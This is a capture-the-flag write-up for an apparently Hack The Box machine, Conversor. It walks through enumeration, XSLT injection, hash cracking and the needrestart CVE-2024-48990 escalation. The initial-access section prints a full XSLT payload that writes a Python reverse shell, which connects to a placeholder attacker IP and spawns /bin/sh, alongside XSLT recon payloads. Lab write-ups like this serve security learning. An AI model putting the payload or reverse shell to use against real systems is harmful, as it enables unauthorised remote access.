+++
date = '2026-05-20T18:45:07+02:00'
draft = false
title = 'Conversor Writeup EN'
+++
**Name:** `joy.scd01`

**Date:** `24/01/2025`

![conversor_pwned.png](/images/imgs_conversor/conversor_pwned.png)

---
# Introduction

_**Conversor**_ is the sixth machine released during **Season 9 (Gacha)**.
It’s an **Easy-level Linux box** that focuses on exploiting an interesting vulnerability: **XSLT Injection**.

In this case, the vulnerability is abused to gain **initial access** by creating a malicious script that is later executed automatically by a **cronjob**.

The privilege escalation requires first a **lateral movement** to another user by using “secrets” dumped from the internal database, and then a **vertical escalation** to root by abusing a **known vulnerability** in a specific version of the **needrestart** binary.

---
# Techniques Used

- **XSLT Injection → RCE**
- **Database Dump → Hash Cracking**
- **Sudo Misconfiguration → CVE-2024-48990**

---
# Enumeration

## nmap

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV -vvv nmap/services conversor
```

```bash
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=
|   256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+
80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
5555/tcp open  freeciv? syn-ack ttl 63
9002/tcp open  dynamid? syn-ack ttl 63
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open ports**:
- **22/tcp** - SSH
- **80/tcp** - HTTP
- **5555/tcp** - freeciv?
- **9002/tcp** - dynamid?

---
## HTTP - Web Enumeration

The web application basically hosts a **converter** that allows the user to **upload** an **XML file** and an **XSL template**, and returns it in a more 💖 **“_aesthetic_”** 💖 format.

![aesthetic_cat.jpg](/images/imgs_conversor/aesthetic_cat.jpg)

**I noticed two interesting things**:

1. The **XSL template** can be downloaded:

![template_download.png](/images/imgs_conversor/template_download.png)

2. The **source code** of the application can also be downloaded:

![sourcecode_download.png](/images/imgs_conversor/sourcecode_download.png)

At first, I focused on the **analysis of the template**, and by searching on Google for exploits related to **XSL files**, I found several resources explaining **XSLT Injection**:

_A vulnerability where a user-supplied **XSLT file** is processed **unsafely on the server side**, allowing an attacker to: **gain RCE, read local files, perform XXE, SSRF, or write files**._

I immediately tested it by executing the **recon payloads** provided by this website:
https://ine.com/blog/xslt-injections-for-dummies

**Payloads**:

```xml
<xsl:value-of select="system-property('xsl:version')" />
<xsl:value-of select="system-property('xsl:vendor')" />
<xsl:value-of select="system-property('xsl:vendor-url')" />
```

The version appeared to be clearly **vulnerable**.
At this point, I spent some time playing with different payloads to better understand the vulnerability, but I was still unable to use it to make progress on the box.

So I decided to carefully analyze the application’s source code.
And I found:

- An internal **database** (`users.db`)

![db_hint.png](/images/imgs_conversor/db_hint.png)

- A **cronjob** executed by the `www-data` user that was running any **Python script** located in:
`/var/www/conversor.htb/scripts/*.py`

![cronjob_hint.png](/images/imgs_conversor/cronjob_hint.png)

This cronjob was the real key to gaining initial access.

---
# Initial Access | XSLT Injection → RCE

Inspired by this guide:
https://x.com/ptswarm/status/1796162911108255974/photo/1

**I crafted the following payload**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:exploit="http://exslt.org/common"
 extension-element-prefixes="exploit"
 version="1.0">
 <xsl:template match="/">
 <exploit:document href="/var/www/conversor.htb/scripts/fall.py" method="text">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<lport>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")</exploit:document>
 </xsl:template>
</xsl:stylesheet>
```

I inserted it into the previously downloaded template and, after starting a **netcat listener**, I uploaded it.

Shortly after, I received a shell as `www-data`:

![initial_access.png](/images/imgs_conversor/initial_access.png)

From there, the first step towards escalation was to analyze the internal database:

![database_dump.png](/images/imgs_conversor/database_dump.png)

---
# Lateral Movement | Database Dump → Hash Cracking → fismathack

The only user present in the internal **database** was `fismathack`.

So, as I usually do when a hash does not seem too complex, I tried cracking it using:
**[https://crackstation.net/](https://crackstation.net/)**

![cracked_hash.png](/images/imgs_conversor/cracked_hash.png)

I then used the recovered password to log in via **SSH**:

 ![Machines/Conversor/imgs/lateral_movement_fismathack.png](/images/imgs_conversor/lateral_movement_fismathack.png)

Inside the home directory, I found the **user flag**:

![Machines/Conversor/imgs/userflag.png](/images/imgs_conversor/userflag.png)

So, user owned, SSH access obtained, password known…

Now obviously: **sudo -l**

![chewing_riccio.gif](/images/imgs_conversor/chewing_riccio.gif)

---
# Privilege Escalation | Sudo misconfiguration → CVE-2024-48990 → root

The user `fismathack` was allowed to execute the **needrestart** binary as `root` without a password:

![sudol&version.png](/images/imgs_conversor/sudol&version.png)

By searching online, **needrestart version 3.7** was found to be vulnerable to **CVE-2024-48990**.

_This binary can be forced to execute the **Python interpreter** using an attacker-controlled **PYTHONPATH** environment variable.
By manipulating this variable, an attacker can cause Python to load **malicious modules** from attacker-controlled paths, resulting in a **Local Privilege Escalation**._

I used the following exploit:
https://github.com/ally-petitt/CVE-2024-48990-Exploit

![privesc_exploit.png](/images/imgs_conversor/privesc_exploit.png)

To trigger it, I modified the environment variable and executed **needrestart** with sudo:

![privesc_trigger.png](/images/imgs_conversor/privesc_trigger.png)

Gaining a **root shell**:

![system_proof.png](/images/imgs_conversor/system_proof.png)

The **root flag** was located in `/root`:

![rootflag.png](/images/imgs_conversor/rootflag.png)

---
# Final Thoughts

Very interesting and educational box.

I had never exploited an **XSLT Injection** before, and I initially struggled to understand the correct attack path to obtain initial access. That made the box feel a bit boring at first, but once I got in, I realized that all the time spent experimenting with different payloads allowed me to fully understand this vulnerability — from how it works to the different ways it can be abused.

The privilege escalation is linear and easy to identify, but still interesting due to the **path hijacking** technique.

**Sources**:

-  **XSLT Injection intro blog (recon payloads)** | https://ine.com/blog/xslt-injections-for-dummies
- **Guide used to craft the XSLT file-write payload** | https://x.com/ptswarm/status/1796162911108255974/photo/1
- **Online Hash Cracker** | https://crackstation.net/
- **Privilege Escalation exploit used** | https://github.com/ally-petitt/CVE-2024-48990-Exploit